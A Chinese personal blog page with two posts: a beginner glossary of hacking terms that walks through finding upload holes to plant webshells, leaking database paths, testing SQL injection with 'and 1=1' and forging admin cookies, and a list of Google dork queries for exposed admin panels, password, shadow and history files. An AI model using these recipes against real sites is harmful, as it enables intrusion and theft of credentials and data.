<p>41.溢出<br>程序在处理我们提交给它的数据时，有的时候忘了检查数据的大小与合法性，那么这些数据可能会超过属<br>于自己的地盘，覆盖到其它数据的盘.如果这些超长数据被精心的策划构造的话，可能会被黑客去执行任意命令<br>.打个比喻来说，windows系统是一个人，会一杯一杯喝我们给它准备的水，其中有一个杯子太小了，我们倒入<br>了大量的水它就会溢出到别的杯子里去，而溢出到别的杯子里的东西我们事先可以设计好，而系统并不知道，<br>这以为这本来就是那个杯子里的东西，于是我们可以完成一定的任务.</p>
<p>42.端口<br>要网络上，知道一台电脑的ip地址，只是相当于知道了它的居住地址，要和它进行通信，我们还要知道它<br>开了哪些端口，比如说我们到一家医院，挂号要到1号窗口，划价要到2号窗口，取药要到3号窗口.那么与计算<br>机的通信也是一样的，要上qq，你得登陆到腾讯服务器的8000端口，要浏览x档案的论坛，你得与其80端口进行<br>联系，要ftp登陆空间，传输文件，我们又得服务器的21端口连接了.可以说，端口就是一种数据的传输通道，<br>用于接收某些数据，然后传给相应的服务，而电脑将这些数据处理后，再将相应的回复通过端口传给对方.</p>
<p>43.ip地址<br>inter上的电脑有许多，为了让他们能够相互识别，inter上的每一台主机都分配有一个唯一的32位地址，该地址称为ip地址，也称作网际地址，ip地址由4个数值部分组成，每个数值部分可取值0-255，各部分之间用一个‘.‘分开.<br>ARP<br>地址解析协议(AddressResolutionProtocol)<br>此协议将网络地址映射到硬件地址。<br>RARP<br>反向地址解析协议(ReverseAddressResolutionProtocol)<br>此协议将硬件地址映射到网络地址<br>UDP<br>用户数据报协议(UserDatagramProtocol)<br>这是提供给用户进程的无连接协议，用于传送数据而不执行正确性检查。<br>FTP<br>文件传输协议(FileTransferProtocol)<br>允许用户以文件操作的方式（文件的增、删、改、查、传送等）与另一主机相互通信。<br>SMTP<br>简单邮件传送协议(SimpleMailTransferProtocol)<br>SMTP协议为系统之间传送电子邮件。<br>TELNET<br>终端协议(TelTerminalProcotol)<br>允许用户以虚终端方式访问远程主机<br>HTTP<br>超文本传输协议(HypertextTransferProcotol)<br>TFTP<br>简单文件传输协议(TrivialFileTransferProtocol)<br>Shell<br>Shell就是系统于用户的交换式界面。简单来说，就是系统与用户的一个沟通环境，我们平时用到的DOS就是一个Shell(Win2K或cmd.exe)。<br>Root<br>Unix里最高权限的用户，也就是超级管理员。<br>Admin<br>WindowsNT/2K/XP里最高权限的用户，也就是超级管理员。<br>Rootshell<br>通过一个溢出程序，在主机溢出一个具有Root权限的Shell。<br>Exploit<br>溢出程序。Exploit里通常包含一些Shellcode。<br>Shellcode<br>溢出攻击要调用的函数，溢出后要一个交换式界面进行操作。所以说就有了Shellcode。<br>AccesControllist(ACL)<br>访问控制列表。<br>AddressResolutionProtocol(ARP)<br>地址解析协议。<br>Administratoraccount<br>管理员帐号。<br>ARPANET<br>阿帕网(Inter的简称)。<br>accesstoken<br>访问令牌。<br>adaptivespeedleveling<br>自适应速度等级调整。<br>algorithm<br>算法alias别名。<br>anlpasswd<br>一种与PASSWD+相似的代理密码检查器。<br>applicatlons<br>应用程序异步传递模式。<br>accoutlockout<br>帐号封锁。<br>accoutpolicies<br>记帐策略。<br>accounts<br>帐号。<br>adapter<br>适配器。</p>
<p>44.上传漏洞<br>这个漏洞在DVBBS6.0时代被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。<br>怎样利用：在网站的地址栏中网址后加上/upfile.asp如果显示“上传格式不正确[重新上传]”这样的字样就是有上传漏洞了，找个可以上传的工具<br>直接可以得到WEBSHELL。<br>工具介绍：上传工具，老兵的上传工具、DOMAIN3.5，这两个软件都可以达到上传的目的，用NC也可以提交。</p>
<p>45.WEBSHELL是什么:<br>其实WEBSHELL并不什么深奥的东西，是个WEB的权限，可以管理WEB，修改主页内容等权限，但是并没有什么特别高的权限，(这个看管理员的设置了)一般修改别人主页大多都需要这个权限，接触过WEB木马的朋友可能知道（比如老兵的站长助手就是WEB木马，海阳2006也是WEB木马）。我们上传漏洞最终传的就是这个东西，有时碰到权限设置不好的服务器可以通过WEBSHELL得到最高权限。</p>
<p>46.暴库<br>这个漏洞现在很少见了，但是还有许多站点有这个漏洞可以利用，暴库就是提交字符得到数据库文件，得到了数据库文件我们就直接有了站点的前台或者后台的权限了。</p>
<p>暴库方法：<br>     比如一个站的地址为<a href="http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161，我门就可以把com/dispbbs中间的/换成\，如果有漏洞直接得到数据库的绝对路径，用寻雷什么的下载下来就可以了。" target="_blank" rel="noopener">http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161，我门就可以把com/dispbbs中间的/换成\，如果有漏洞直接得到数据库的绝对路径，用寻雷什么的下载下来就可以了。</a><br>     还有种方法就是利用默认的数据库路径<a href="http://www.xxx.com/后面加上conn.asp。如果没有修改默认的数据库路径也可以得到数据库的路径（注意：这里的/也要换成\）。" target="_blank" rel="noopener">http://www.xxx.com/后面加上conn.asp。如果没有修改默认的数据库路径也可以得到数据库的路径（注意：这里的/也要换成\）。</a><br>     为什么换成\：因为在ASCII码里/等于\，有时碰到数据库名字为/#abc.mdb的为什么下不了?这里需要把#号换成#就可以下载了，为什么我暴出的数据库文件是以.ASP结尾的?我该怎么办?这里可以在下载时把.ASP换成.MDB这样就可以下载了如果还下载不了可能作了防下载。</p>
<p>47.注入漏洞<br>这个漏洞是现在应用最广泛，杀伤力也很大的漏洞，可以说微软的官方网站也存在着注入漏洞。注入漏洞是因为字符过滤不严禁所造成的，可以得到管理员的帐号密码等相关资料。<br> 怎样利用：<br>我先介绍下怎样找漏洞比如这个网址<a href="http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161后面是以ID=数字形式结尾的站我们可以手动在后面加上个and1=1看看" target="_blank" rel="noopener">http://www.xxx.com/dispbbs.asp?boardID=7&amp;ID=161后面是以ID=数字形式结尾的站我们可以手动在后面加上个and1=1看看</a><br>如果显示正常页面再加上个and1=2来看看如果返回正常页面说明没有漏洞如果返回错误页面说明存在注入漏洞。如果加and1=1返回错误页面说明也没有漏洞，知道了站点有没有漏洞我们就可以利用手工来猜解也可以用工具现在工具比较多（NBSI、NDSI、啊D、DOMAIN等），都可以用来猜解帐号密码，因为是菜鸟接触，我还是建议大家用工具，手工比较烦琐。</p>
<p>48.旁注<br>我们入侵某站时可能这个站坚固的无懈可击，我们可以找下和这个站同一服务器的站点，然后在利用这个站点用提权，嗅探等方法来入侵我们要入侵的站点。<br>打个形象的比喻，比如你和我一个楼，我家很安全，而你家呢，却漏洞百出，现在有个贼想入侵我家，他对我家做了监视（也就是扫描），发现没有什么可以利用的东西，那么这个贼发现你家和我家一个楼，你家很容易就进去了，他可以先进入你家，然后通过你家得到整个楼的钥匙（系统权限），这样就自然得到我的钥匙了，就可以进入我的家（网站）。</p>
<p>工具介绍：<br>还是名小子的DOMIAN3.5不错的东西，可以检测注入，可以旁注，还可以上传!</p>
<p>49.COOKIE诈骗<br>许多人不知道什么是COOKIE，COOKIE是你上网时由网站所为你发送的值记录了你的一些资料，比如IP，姓名什么的。<br>怎样诈骗呢？如果我们现在已经知道了XX站管理员的站号和MD5密码了，但是破解不出来密码（MD5是加密后的一个16位的密码）。我们就可以用<br>COOKIE诈骗来实现，把自己的ID修改成管理员的，MD5密码也修改成他的，有工具可以修改COOKIE这样就答到了COOKIE诈骗的目的，系统以为你就是管理员了。</p>
<p>50.防火墙系统：<br>IDS入侵检测——现在一般有成品软件卖</p>
<p>51.时间戳<br>  “时间戳”是个听起来有些玄乎但实际上相当通俗易懂的名词，我们查看系统中的文件属性，其中显示的创建、修改、访问时间就是该文件的时间戳。<br>    对于大多数一般用户而言，通过修改“时间戳”也许只是为了方便管理文件等原因而掩饰文件操作记录。但对于应用数字时间戳技术的用户就并非这么“简单”了，这里的“时间戳”（time-stamp）是一个经加密后形成的凭证文档，是数字签名技术的一种变种应用。<br>     在电子商务交易文件中，利用数字时间戳服务（DTS：digita1timestampservice）能够对提供电子文件的日期和时间信息进行安全保护，以防止被商业对手等有不良企图的人伪造和串改的关键性内容。</p>
<p>52.MySQL数据库<br>     我们在黑客文章中常会看到针对“MySQL数据库”的攻击，但很多朋友却对其不大了解。“MySQL数据库”之所以应用范围如此广泛，是由于它是一款免费的开放源代码的多用户、多线程的跨平台关系型数据库系统，也可称得上是目前运行速度最快的SQL语言数据库。</p>
<p>   “MySQL数据库”提供了面向C、C++、Java等编程语言的编程接口，尤其是它与PHP的组合更是黄金搭档。“MySQL数据库”采用的是客户机/服务器结构的形式，它由一个服务器守护程序Mysqld和很多不同的客户程序和库组成。但若是配置不当，“MySQL数据库”就可能会受到攻击，例如若是设置本地用户拥有对库文件读权限，那么入侵者只要获取“MySQL数据库”的目录，将其复制本机数据目录下就能访问进而窃取数据库内容。</p>
<p>53.MD5验证<br>MD5（全称是message-digestalgorithm5）的作用是让大容量信息在用数字签名软件签署私人密匙前被“压缩”为一种保密的格式。它的典型应用是对一段信息（message）产生信息摘要（message-digest），以防止被篡改。通俗地说MD5码就是个验证码，就像我们的个人身份证一样，每个人的都是不一样的。MD5码是每个文件的唯一校验码（MD5不区分大小写，但由于MD5码有128位之多，所以任意信息之间具有相同MD5码的可能性非常之低，通常被认为是不可能的），凭借此特性常被用于密码的加密存储、数字签名及文件完整性验证等功能。通过MD5验证即可检查文件的正确性，例如可以校验出下载文件中是否被捆绑有其它第三方软件或木马、后门（若是校验结果不正确就说明原文件已被人擅自串改）。</p>
<p>54.ICMP协议<br>ICMP（全称是InterControlMessageProtocol，即Inter控制消息协议）用于在IP主机、路由器之间传递控制消息，包括网络通不通、主机是否可达、路由是否可用等网络本身的消息。例如，我们在检测网络通不通时常会使用Ping命令，Ping执行操作的过程就是ICMP协议工作的过程。“ICMP协议”对于网络安全有着极其重要的意义，其本身的特性决定了它非常容易被用于攻击网络上的路由器和主机。例如，曾经轰动一时的海信主页被黑事件就是以ICMP攻击为主的。由于操作系统规定ICMP数据包最大尺寸不超过64KB，因而如果向目标主机发送超过64KB上限的数据包，该主机就会出现内存分配错误，进而导致系统耗费大量的资源处理，疲于奔命，最终瘫痪、死机。</p>
<p>55.WAP攻击<br>黑客们在网络上疯狂肆虐之后，又将“触角”伸向了WAP（无线应用协议的英文简写），继而WAP成为了他们的又一个攻击目标。“WAP攻击”主要是指攻击WAP服务器，使启用了WAP服务的手机无法接收正常信息。由于目前WAP无线网络的安全机制并非相当严密，因而这一领域将受到越来越多黑客的“染指”。现在，我们使用的手机绝大部分都已支持WAP上网，而手机的WAP功能则需要专门的WAP服务器来支持，若是黑客们发现了WAP服务器的安全漏洞，就可以编制出针对该WAP服务器的病毒，并对其进行攻击，从而影响到WAP服务器的正常工作，使WAP手机无法接收到正常的网络信息。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/14/Google%E8%AF%AD%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/14/Google%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">Google语法</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-14 15:24:44" itemprop="dateCreated datePublished" datetime="2019-11-14T15:24:44+08:00">2019-11-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-11-20 14:11:46" itemprop="dateModified" datetime="2019-11-20T14:11:46+08:00">2019-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>tags：Google语法<br>categories: 渗透基本知识<br>1、基本：</p>
<p>site：指定域名<br>inurl:URL中存在关键字的网页<br>intext:网页正文中的关键字<br>filetype：指定文件类型<br>intitle：网页标题中的关键字<br>link：link：baidu.com即表示返回所有和baidu.com做了链接的URL<br>info：查找指定站点的一些基本信息<br>cache：搜索Google里关于某些内容的缓存</p>
<p>+把google可能忽略的字列如查询范围<br>-把某个字忽略<br>~允许词<br>.单一的通配符<br>星号通配符，可代表多个字母 ，<br>与通配符星号不一样的是，点号“.”匹配的是字符，不是字、短语等内容。保留的字符有[、(、-等。<br>“”精确查询</p>
<p>2.详解</p>
<p>intitle</p>
<pre><code>intitle语法通常被用来搜索网站的后台、特殊页面和文件，通过在Google中搜索“intitle:登录”、“intitle:管理”就可以找到很多网站的后台登录页面。此外，intitle语法还可以被用在搜索文件上，例如搜索“intitle:&quot;indexof&quot;etc/shadow”就可以找到Linux中因为配置不合理而泄露出来的用户密码文件。</code></pre><p>inurl</p>
<pre><code>Google Hack中，inurl发挥的作用的最大，主要可以分为以下两个方面:寻找网站后台登录地址，搜索特殊URL。
寻找网站后台登录地址：和intitle不同的是，inurl可以指定URL中的关键字，我们都知道网站的后台URL都是类似login.asp、admin.asp为结尾的，那么我们只要以“inurl:login.asp”、“inurl:admin.asp”为关键字进行搜索，同样可以找到很多网站的后台。此外，我们还可以搜索一下网站的数据库地址，以“inurl:data”、“inurl:db”为关键字进行搜索即可。</code></pre><p>intext</p>
<pre><code>intext的作用是搜索网页中的指定字符，这貌似在Google Hack中没有什么作用，不过在以“intext:to parent directory”为关键字进行搜索后，我们会很惊奇的发现，无数网站的目录暴露在我们眼前。我们可以在其中随意切换目录，浏览文件，就像拥有了一个简单的Webshell。形成这种现象的原因是由于IIS的配置疏忽。同样，中文IIS配置疏忽也可能出现类似的漏洞，我们用“intext:转到父目录”就可以找到很多有漏洞的中文网站。</code></pre><p>Site</p>
<pre><code>黑客使用Site，通常都是做入侵前的信息刺探。Site语法可以显示所有和目标网站有联系的页面，从中或多或少存在一些关于目标网站的资料，这对于黑客而言就是入侵的突破口，是关于目标网站的一份详尽的报告。</code></pre><p>语法组合，威力加倍</p>
<p>Filetype</p>
<pre><code>Filetype的作用是搜索指定文件。假如我们要搜索网站的数据库文件，那么可以以“filetype:mdb”为关键字进行搜索，很快就可以下载到不少网站的数据库文件。当然，Filetype语法的作用不仅于此，在和其他语法配合使用的时候更能显示出其强大作用</code></pre><p>3、进阶：</p>
<p>后台：site:xxx.xxx admin|login|system|管理|登录|内部|系统<br>钓鱼：site:xxx.xxx 邮件|email<br>社工：site:xxx.xxx qq|群|微信|腾讯<br>越权：site:xxx.xxx inurl:uid=1|userid=1<br>包含：site:xxx.xxx inurl:php?include=</p>
<p>1、site:220.181.38.*                             扫描c段<br>2、site:*.181.38.148                             扫描子域名<br>3、site:xxxx.com intext:管理                        后台<br>  site:xxxx.com inurl:login<br>  site:xxxx.com intitle:管理<br>  查找后台地址：<br>  site:域名      inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username<br>4、intitle:”index of” etc                   敏感信息搜索<br>intitle:”Index of” .sh_history<br>intitle:”Index of” .bash_history<br>intitle:”index of” passwd<br>intitle:”index of” people.lst<br>intitle:”index of” pwd.db<br>intitle:”index of” etc/shadow<br>intitle:”index of” spwd<br>intitle:”index of” master.passwd<br>intitle:”index of” htpasswd</p>
<p>filetyle:xls inurl:gov username password<br>inurl:phpmyadmin/main.php intitle:phpmyadmin<br>filetype:inc inurl:config.inc host<br>filetype:sql cdb_members inurl:forumdata<br>filetype:txt inurl:”新建文本文档.txt”密码<br>inurl:phpinfo.php intitle:”phpinfo()””PHP Version”+”Server API”<br>filetype:log inurl:log mdb<br>5、<br>Index of /admin                                        目录浏览<br>Index of /passwd<br>Index of /password<br>Index of /mail<br>“Index of /” +passwd<br>“Index of /” +password.txt<br>“Index of /” +.htaccess<br>“Index of /root”<br>“Index of /cgi-bin”<br>“Index of /logs”<br>“Index of /config”<br>6、<br>site:xx.com inurl:file                               上传<br>site:xx.com inurl:load<br>inurl:file|load|editor|Files<br>7、<br>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p>
<p>8、<br>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  



          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="魏超"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">魏超</p>
  <div class="site-description" itemprop="description">胡歌</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">魏超</span>
</div>
  <!--<div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
  </div>
--!>

        












        
      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  
















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/clicklove.js"></script>
